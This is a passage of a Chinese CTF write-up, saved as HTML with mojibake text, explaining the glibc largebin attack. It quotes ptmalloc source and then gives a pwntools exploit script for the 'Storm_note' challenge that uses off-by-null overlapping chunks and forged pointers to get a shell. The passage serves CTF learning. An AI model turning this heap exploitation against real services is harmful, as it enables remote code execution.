class="comment">       have to perform a complete insert here.  */</span></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    remainder-&gt;bk = bck;</span><br><span class="line">    remainder-&gt;fd = fwd;</span><br><span class="line">    bck-&gt;fd = remainder;</span><br><span class="line">    fwd-&gt;bk = remainder;    <span class="comment">// å°†åˆ‡å‰²å‰©ä½™çš„éƒ¨åˆ†æ’å…¥åˆ° unsortedbin ä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;  <span class="comment">// å¦‚æœå‰©ä¸‹çš„å¤§å°æ˜¯ largebinï¼Œæ¸…é™¤å®ƒçš„ fd_nextsizeã€bk_nextsize æŒ‡é’ˆ(å› ä¸ºå®ƒä»¬åœ¨ uunsortedbin ä¸­æ— ç”¨)</span></span><br><span class="line">      &#125;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot(remainder, remainder_size);</span><br><span class="line">  &#125;</span><br><span class="line">  check_malloced_chunk(av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = chunk2mem(victim);   <span class="comment">// è¿”å›å †å—</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­æœ€ä¸ºé‡è¦çš„å°±æ˜¯ unlink å®ï¼Œå®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">  FD = P-&gt;fd;                                                          \</span></span><br><span class="line"><span class="meta">  BK = P-&gt;bk;                                                          \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \</span></span><br><span class="line"><span class="meta">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span> &#123;                                                               \</span></span><br><span class="line"><span class="meta">    FD-&gt;bk = BK;                                                       \</span></span><br><span class="line"><span class="meta">    BK-&gt;fd = FD;                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       \</span></span><br><span class="line"><span class="meta">	&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;	       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	&#125;							       \</span></span><br><span class="line"><span class="meta">      &#125;	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span></span><br><span class="line"><span class="meta">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span></span><br><span class="line"><span class="meta">      &#125;								       \</span></span><br><span class="line"><span class="meta">    &#125;								       \</span></span><br><span class="line"><span class="meta">  &#125;                                                                    \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>unlink å¯¹äºæ™®é€šå †å—å’Œ largebin å †å—æœ‰ä¸åŒçš„æ“ä½œï¼ŒåŸå› æ˜¯ largebin çš„ç»“æ„æ¯”è¾ƒç‰¹æ®Šï¼Œä¸ºäº†æé«˜å †å—åˆ†é…çš„æ•ˆç‡ï¼Œéœ€è¦é’ˆå¯¹ largebin è¿›è¡Œä¼˜åŒ–ã€‚</p>
<p>å½“ unlink ä¸€ä¸ª largebin chunk çš„æ—¶å€™ï¼Œé¦–å…ˆåˆ¤æ–­ chunk æ˜¯å¦å±äº largebinï¼Œå¹¶ä¸”éœ€è¦æ»¡è¶³ P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D;&#x3D; P ï¼ŒP-&gt;bk_nextsize-&gt;fd_nextsize &#x3D;&#x3D; Pï¼Œè¿™äº›åˆ¤æ–­æ¡ä»¶ä¸ unlink ä¸€ä¸ªæ­£å¸¸å †å—ç±»ä¼¼ã€‚æ¥ä¸‹æ¥åˆ†æˆä¸‰ç§æƒ…å†µã€‚</p>
<p>æƒ…å†µä¸€ï¼šlargebin ä¸­åªå­˜åœ¨ä¸€ç»„çºµå‘é“¾è¡¨ï¼Œè¦ unlink é“¾è¡¨çš„é¦–èŠ‚ç‚¹ã€‚</p>
<p>å¯¹åº”ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       \</span><br><span class="line">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span><br><span class="line">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span><br></pre></td></tr></table></figure></div>


<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack2.png"
                     
                ></p>
<p>æƒ…å†µäºŒï¼š largebin ä¸­å­˜åœ¨å¤šç»„ä¸åŒå¤§å°çš„çºµå‘é“¾è¡¨ï¼Œè¦ unlink å…¶ä¸­ä¸€ä¸ªçºµå‘é“¾è¡¨çš„é¦–èŠ‚ç‚¹ã€‚</p>
<p>å¯¹åº”ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;							       \</span><br><span class="line">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span><br><span class="line">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span><br><span class="line">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span><br><span class="line">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span><br><span class="line">	&#125;							       \</span><br></pre></td></tr></table></figure></div>


<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack3.png"
                     
                ></p>
<p>æƒ…å†µä¸‰ï¼šæœ‰å¤šç»„ä¸åŒå¤§å°çš„çºµå‘é“¾è¡¨ï¼Œè¦ unlink å…¶ä¸­ä¸€ä¸ªé“¾è¡¨çš„é¦–èŠ‚ç‚¹ï¼Œä½†æ˜¯è¿™ä¸ªé“¾è¡¨åªæœ‰ä¸€ä¸ª chunkã€‚</p>
<p>å¯¹åº”ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;							       \</span><br><span class="line">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span><br><span class="line">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span><br><span class="line">      &#125;								       \</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå°±ä¸ç”»å›¾äº†ã€‚</p>
<p>ä»ä¸Šé¢çš„ä¾‹å­æ¥çœ‹ï¼Œå½“ä» largebin ä¸­åˆ†é…å †å—çš„æ—¶å€™ï¼Œé¦–å…ˆè¦æ‰¾åˆ°åˆé€‚å¤§å°çš„çºµå‘é“¾è¡¨ï¼Œç”±äºæ¯ä¸€æ¡çºµå‘é“¾è¡¨çš„ chunk å¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥åªéœ€å–ç¬¬ä¸€ä¸ª chunk å³å¯ã€‚å½“å–å‡ºè¿™ä¸ª chunk çš„æ—¶å€™æ ¹æ®å½“å‰çºµå‘é“¾è¡¨æƒ…å†µä¸åŒæœ‰ä¸‰ç§ä¸åŒçš„å¤„ç†åŠæ³•ï¼Œä½†å®é™…ä¸Šå®ƒä»¬çš„åŸç†æ˜¯ç›¸åŒçš„ï¼Œå¦‚æœçºµå‘é“¾è¡¨æœ‰å¤šä¸ª chunkï¼Œé‚£ä¹ˆç›´æ¥å°†ç¬¬äºŒä¸ª chunk æå‰åˆ°æ¨ªå‘é“¾è¡¨ä¸­å³å¯ï¼Œå¦‚æœæ²¡æœ‰å¤šä½™çš„ chunkï¼Œå°±å°†è¿™ä¸ªçºµå‘é“¾è¡¨ä»æ¨ªå‘é“¾è¡¨ä¸­å»é™¤ã€‚</p>
<p>ç”±äº unlink çš„è¿‡ç¨‹ä¸­ä¼šå¯¹ chunk çš„ fd_nextsize ä»¥åŠ bk_nextsize è¿›è¡Œè¯»å†™ï¼Œå¦‚æœèƒ½å¤Ÿæ§åˆ¶è¿™äº›æŒ‡é’ˆï¼Œå°±èƒ½æ„é€ ç±»ä¼¼ unlink çš„æ•ˆæœï¼Œåœ¨ä»»æ„åœ°å€å†™å…¥å †çš„åœ°å€ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ"><a href="#æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ" class="headerlink" title="æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ"></a>æ¼æ´åˆ©ç”¨æ€è·¯åˆ†æ</h2><p>æ„é€ ä¸¤ä¸ª overlap largebin chunkï¼Œä¸€ä¸ªè¾ƒå¤§ï¼Œä¸€ä¸ªè¾ƒå°ï¼Œä½†æ˜¯ä¸¤ä¸ª chunk çš„ size è¦ä½äºåŒä¸€ä¸ª index èŒƒå›´å†…ã€‚</p>
<p>å…ˆå°†è¾ƒå°çš„ chunk freeï¼Œæ”¾åœ¨ largebin ä¸­(å•æ‰§è¡Œ free æ“ä½œ chunk ä¼šè¿›å…¥åˆ° unsortedbin ä¸­ï¼Œè¿˜éœ€è¦å†åšä¸€ä¸ª malloc æ‰èƒ½å°†ä¸åˆé€‚çš„ chunk æ”¾åœ¨å¯¹åº”çš„é“¾è¡¨ä¸­ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ ptmalloc çš„æºä»£ç )ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ overlap ä¿®æ”¹è¿™ä¸ª chunk ä¸­çš„å„ç§æŒ‡é’ˆã€‚ç„¶åå°†è¾ƒå¤§çš„ chunk free ï¼Œè¿™ä¸ª chunk ä¼šè¿›å…¥ unsortedbinï¼Œå¹¶ä¸”ä¹Ÿèƒ½é€šè¿‡ overlap ä¿®æ”¹å…¶ä¸­çš„æŒ‡é’ˆã€‚</p>
<p>ç›®çš„æ˜¯ä¼ªé€ ä¸€ç§åˆæ³•çš„æ¡ä»¶ï¼Œå½“è¾ƒå¤§çš„ chunk ä» unsortedbin ä¸­å–å‡ºæ’å…¥ largebin çš„è¿‡ç¨‹ä¸­ï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—æŒ‡é’ˆæ“ä½œï¼Œé€šè¿‡è¿™äº›æ“ä½œæˆ‘ä»¬å¯ä»¥åœ¨ mmap çš„åŒºåŸŸå†™å…¥ heap çš„åœ°å€ï¼Œç”±äº heap åœ°å€æœ€é«˜å­—èŠ‚æ¯”è¾ƒå›ºå®š(é€šå¸¸ä¸º 0x56 æˆ– 0x55 )ï¼Œæ‰€ä»¥åˆ©ç”¨é”™ä½çš„æŠ€å·§å°±èƒ½ä¼ªé€ å‡ºä¸€ä¸ªâ€œåˆæ³•çš„ sizeâ€ï¼Œæ³¨æ„æˆ‘ä»¬æ˜¯åˆ©ç”¨ unsorted bin æ’å…¥ largebin æ¥å®ç°ä»»æ„åœ°å€å†™çš„ï¼Œæ­¤æ—¶ unsorted bin çš„ bk æŒ‡é’ˆå·²ç»è¢«æ”¹å†™ä¸º mmap åŒºåŸŸçš„åœ°å€ï¼Œå½“è§¦å‘ largebin attack æ”¹å†™ mmap åŒºåŸŸåœ°å€ä¹‹åï¼Œ å°±ç›¸å½“äºå°† mmap åŒºåŸŸé“¾æ¥åˆ°äº† unsortedbin ä¸­ï¼Œåœ¨ ptmalloc å†…éƒ¨ä»£ç ä¸­ä¼šéªŒè¯è¿™å—å†…å­˜æ˜¯å¦åˆæ³•ï¼Œç”±äºå¿…è¦å‚æ•°å·²ç»æå‰ä¼ªé€ ï¼Œæ‰€ä»¥å¯ä»¥å°† mmap è¿™å—å†…å­˜è¿”å›ç»™æˆ‘ä»¬æ§åˆ¶ï¼Œè¿›è€Œä¿®æ”¹éšæœºæ•° getshellã€‚</p>
<p>æˆ‘å€Ÿç”¨æ¢…å­é…’å…¬ä¼—å·ä¸Šçš„ wp æ¥è¿›è¡Œè¯´æ˜ï¼Œé¦–å…ˆå°è£…ä¸€äº›å‡½æ•°</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./Storm_note&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;ctf1.linkedbyx.com&#x27;,10444)</span></span><br><span class="line"><span class="comment">#port:10444</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,mes</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€æ­¥æ˜¯æ„é€  overlap çš„ chunkï¼Œåˆå§‹çŠ¶æ€åˆ†é…äº†ä¸‹é¢è¿™äº›å †å—</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå°† chunk1 åˆ é™¤ï¼Œåš off-by-nullï¼Œæ„é€  overlap çš„ largebin chunkã€‚å¦‚æ³•ç‚®åˆ¶ï¼Œå†æ„é€ å¦ä¸€ä¸ª overlap çš„ largebin chunkã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># åå‘åˆå¹¶,æ„é€ ç¬¬ä¸€ä¸ª overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># åå‘åˆå¹¶,æ„é€ ç¬¬äºŒä¸ª overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br></pre></td></tr></table></figure></div>

<p>overlap çš„ chunk:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack4.jpeg"
                     
                ></p>
<p>æˆ‘ä»¬å°†ä¸¤ä¸ª overlap çš„ chunk è¿›è¡Œ freeï¼Œunsortedbin ä¸­å‘ˆç°ä»¥ä¸‹ç»“æ„</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¾ƒå°çš„ chunk -&gt; è¾ƒå¤§çš„ chunk</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åé€šè¿‡ add(0x4e8) å°†è¾ƒå¤§çš„ chunk æ‹¿å›æ¥ï¼Œé‚£ä¹ˆå°çš„é‚£ä¸ªå°±ä¼šè¿›å…¥ largebinã€‚</p>
<p>å† delete åˆšåˆšæ‹¿å›æ¥çš„ chunkï¼Œé‚£ä¹ˆé“¾è¡¨å‘ˆç°ä»¥ä¸‹ç»“æ„</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">largebinï¼š è¾ƒå°çš„ chunk</span><br><span class="line">unsortedbinï¼š è¾ƒå¤§çš„ chunk</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶é€šè¿‡ overlap åˆ†åˆ«ç¼–è¾‘ä½äº unsortedbin å’Œ largebin ä¸­çš„ chunk çš„æŒ‡é’ˆï¼Œæ„é€  largebin attack çš„æ¡ä»¶</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br></pre></td></tr></table></figure></div>

<p>ä»¥ä¸Šæ“ä½œå®Œæˆä¹‹åï¼Œå†æ‰§è¡Œ add(0x48) è¿™ä¸ªæ“ä½œï¼Œptmalloc ä¼šå…ˆå» unsortedbin å¯»æ‰¾åˆé€‚çš„ chunkï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ‰¾åˆ°ï¼Œå¹¶ä¸”å½“å‰å­˜åœ¨äº unsorted bin ä¸­çš„ chunk ä¹Ÿä¸æ˜¯ last_remainder ä¸ä¼šåˆ‡å‰²ã€‚äºæ˜¯ä¼šå°†è¿™ä¸ª chunk å…ˆæ’å…¥åˆ° largebin ä¸­ï¼Œç”±äºæˆ‘ä»¬å·²ç»ä¿®æ”¹äº†å…¶ä¸­çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åœ¨æ’å…¥ chunk çš„è¿‡ç¨‹ä¸­å°±ä¼šåœ¨ç›®æ ‡åŒºåŸŸå†™å…¥ heap çš„åœ°å€ï¼Œåˆ©ç”¨é”™ä½å³å¯æ„é€ å‡ºåˆé€‚çš„ sizeã€‚</p>
<p>malloc åœ¨å¾ªç¯ä¸€åœˆä¹‹åå›åˆ°å¾ªç¯èµ·ç‚¹ï¼Œå†æ¬¡åˆ¤æ–­ bk æ˜¯å¦ä¸ºç©ºï¼Œä½†æ˜¯ bk æ­¤æ—¶å·²ç»æŒ‡å‘äº†ç›®æ ‡åŒºåŸŸï¼Œè¿™æ˜¯ç”±äºæ’å…¥ largebin çš„è¿‡ç¨‹ä¸­ä¼šå…ˆå°† chunk ä» unsorted bin unlinkï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ bck &#x3D; victim -&gt; bk</p>
<p>é‚£ä¹ˆ unsorted_chunks(av)-&gt;bk &#x3D; victim -&gt; bk &#x3D; target</p>
<p>æ‰€ä»¥å½“å†æ¬¡å¾ªç¯åˆ°èµ·ç‚¹æ—¶ï¼Œptmalloc æ£€æµ‹åˆ° bk ä¸ä¸ºç©ºï¼Œå¹¶ä¸”å®ƒæŒ‡å‘çš„ chunk(target) çš„ size è¿˜æ­£å¥½å’Œåˆ†é…çš„ size ç²¾ç¡®ç›¸ç­‰ï¼Œæ‰€ä»¥ç›´æ¥å°† chunk å–å‡ºï¼Œè¿™é‡Œå–å‡ºçš„å°±æ˜¯ targetï¼Œç„¶åä¿®æ”¹éšæœºæ•° + åˆ©ç”¨ backdoor å‡½æ•°å³å¯ getshellï¼</p>
<h2 id="å®Œæ•´-EXP"><a href="#å®Œæ•´-EXP" class="headerlink" title="å®Œæ•´ EXP"></a>å®Œæ•´ EXP</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./Storm_note&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,mes</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># åå‘åˆå¹¶,æ„é€ ç¬¬ä¸€ä¸ª overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># åå‘åˆå¹¶,æ„é€ ç¬¬äºŒä¸ª overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, 